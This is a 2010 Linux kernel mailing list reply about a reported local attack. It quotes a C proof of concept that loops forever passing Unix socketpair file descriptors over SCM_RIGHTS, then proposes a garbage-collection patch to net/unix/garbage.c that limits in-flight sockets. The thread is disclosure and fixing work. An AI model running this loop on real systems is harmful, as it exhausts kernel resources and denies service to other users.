Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1751525Ab0KYG2a (ORCPT <rfc822;w@1wt.eu>);
	Thu, 25 Nov 2010 01:28:30 -0500
Received: from mail-ww0-f44.google.com ([74.125.82.44]:43277 "EHLO
	mail-ww0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751029Ab0KYG22 (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Thu, 25 Nov 2010 01:28:28 -0500
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=subject:from:to:cc:in-reply-to:references:content-type:date
         :message-id:mime-version:x-mailer:content-transfer-encoding;
        b=cz18JPtqVaHyebTzo4+p9OLgEEMuPUP4ivRnLhGdAtPYeJUYxlHLEf6r3Y+iSNcJum
         KF3aX4pj8SiIfapr+JBaEPtwFKc7anPrKFTgCGJDaG++PvA4m2JjWrfaF/trPv07RIBT
         zPT2YLTI8I5dLnDXdm4f7tTj1vFakAuSfyr0E=
Subject: Re: Simple kernel attack using socketpair. easy, 100%
 reproductiblle, works under guest. no way to protect :(
From: Eric Dumazet <eric.dumazet@gmail.com>
To: =?UTF-8?Q?=D0=9C=D0=B0=D1=80=D0=BA_?=
	 =?UTF-8?Q?=D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3?= 
	<socketpair@gmail.com>
Cc: linux-kernel@vger.kernel.org, netdev <netdev@vger.kernel.org>,
        David Miller <davem@davemloft.net>
In-Reply-To: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
References: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Date: Thu, 25 Nov 2010 07:28:21 +0100
Message-ID: <1290666501.2798.84.camel@edumazet-laptop>
Mime-Version: 1.0
X-Mailer: Evolution 2.30.3 
Content-Transfer-Encoding: 8bit
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Le jeudi 25 novembre 2010 à 10:57 +0500, Марк Коренберг a écrit :
> #include <sys/socket.h>
> #include <sys/un.h>
> 
> static int send_fd (int unix_fd, int fd)
> {
>   struct msghdr msgh;
>   struct cmsghdr *cmsg;
>   char buf[CMSG_SPACE (sizeof (fd))];
> 
>   memset (&msgh, 0, sizeof (msgh));
>   memset (buf, 0, sizeof (buf));
> 
>   msgh.msg_control = buf;
>   msgh.msg_controllen = sizeof (buf);
> 
>   cmsg = CMSG_FIRSTHDR (&msgh);
>   cmsg->cmsg_len = CMSG_LEN (sizeof (fd));
>   cmsg->cmsg_level = SOL_SOCKET;
>   cmsg->cmsg_type = SCM_RIGHTS;
> 
>   msgh.msg_controllen = cmsg->cmsg_len;
> 
>   memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
>   return sendmsg (unix_fd, &msgh, 0);
> }
> 
> 
> int main ()
> {
>   int fd[2], ff[2];
>   int target;
> 
>   if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)==-1)
>     return 1;
> 
>   for (;;)
>   {
>     if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)==-1)
>         return 2;
>     send_fd (ff[0], fd[0]);
>     send_fd (ff[0], fd[1]);
>     close (fd[1]);
>     close (fd[0]);
>     fd[0] = ff[0];
>     fd[1] = ff[1];
>   }
> } 


Since you obviously read recent mails on this subject yesterday, why
dont you Cc netdev ?

There is a very easy way to protect against this actually.

A patch was posted yesterday, and need some adjustements.


diff --git a/net/unix/garbage.c b/net/unix/garbage.c
index c8df6fd..40df93d 100644
--- a/net/unix/garbage.c
+++ b/net/unix/garbage.c
@@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_sock *u)
 }
 
 static bool gc_in_progress = false;
+#define UNIX_INFLIGHT_TRIGGER_GC 2000
 
 void wait_for_unix_gc(void)
 {
+	/*
+	 * If number of inflight sockets is insane,
+	 * force a garbage collect right now.
+	 */
+	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
+		unix_gc();
 	wait_event(unix_gc_wait, gc_in_progress == false);
 }
 


